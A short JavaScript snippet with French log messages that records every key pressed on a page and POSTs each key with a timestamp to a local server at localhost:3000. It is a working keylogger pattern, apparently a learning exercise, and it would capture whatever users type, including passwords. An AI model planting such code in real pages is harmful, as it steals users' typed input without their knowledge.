document.addEventListener('keydown', (e) => {
    console.log(e.key);

    const data = {
        key: e.key,
        time: new Date().getTime()
    };

    fetch('http://localhost:3000/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(responseText => {
        console.log('Réponse du serveur :', responseText);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi des données :', error);
    });
    
});
